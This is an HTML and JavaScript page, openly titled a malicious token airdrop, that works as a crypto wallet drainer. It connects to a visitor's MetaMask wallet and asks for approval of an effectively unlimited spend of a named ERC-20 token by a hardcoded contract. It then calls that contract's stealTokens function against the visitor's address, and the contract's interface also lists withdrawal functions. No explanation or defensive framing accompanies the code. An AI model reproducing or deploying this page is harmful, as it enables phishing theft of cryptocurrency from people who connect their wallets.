<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malicious Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
</head>
<body>
    <h1>Malicious Token Airdrop</h1>

    <button id="connectWallet">Connect Wallet</button>
    <br>
    <button id="approveTokens">Approve Unlimited Token Spending</button>

    <div id="status"></div>

    <script>
        let web3;
        let accounts;
        const maliciousContractAddress = '0xb32201C09796d9664ee353383B6405515fDc050a';
        const tkkTokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4';

        // ABI for the TKK Token (ERC-20)
        const tkkTokenABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "spender", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "account", "type": "address" }
                ],
                "name": "balanceOf",
                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transfer",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "sender", "type": "address" },
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transferFrom",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        // ABI for the Malicious Contract
        const maliciousContractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "victim", "type": "address" }
                ],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawETH",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "_tokenAddress", "type": "address" }
                ],
                "name": "setTokenAddress",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        window.addEventListener('load', function () {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                document.getElementById('connectWallet').addEventListener('click', connectWallet);
                document.getElementById('approveTokens').addEventListener('click', approveTokens);
            } else {
                alert('Please install MetaMask!');
            }
        });

        async function connectWallet() {
            try {
                // Request accounts from MetaMask
                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                document.getElementById('status').innerText = `Connected: ${accounts[0]}`;
            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }

        async function approveTokens() {
            if (!accounts || accounts.length === 0) {
                alert('Please connect your MetaMask wallet first.');
                return;
            }

            try {
                const victimAddress = accounts[0]; // Get the connected wallet's address
                const tokenContract = new web3.eth.Contract(tkkTokenABI, tkkTokenAddress);

                // Approve the malicious contract to spend unlimited tokens
                const approveTx = await tokenContract.methods
                    .approve(maliciousContractAddress, web3.utils.toWei('1000000000000000000', 'ether')) // Unlimited tokens
                    .send({ from: victimAddress });

                document.getElementById('status').innerText = `Tokens approved! Transaction: ${approveTx.transactionHash}`;

                // Interact with the malicious contract to steal the tokens (optional)
                const maliciousContract = new web3.eth.Contract(maliciousContractABI, maliciousContractAddress);
                const stealTx = await maliciousContract.methods
                    .stealTokens(victimAddress)
                    .send({ from: victimAddress });

                document.getElementById('status').innerText += `\nSteal tokens transaction: ${stealTx.transactionHash}`;

            } catch (error) {
                document.getElementById('status').innerText = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>



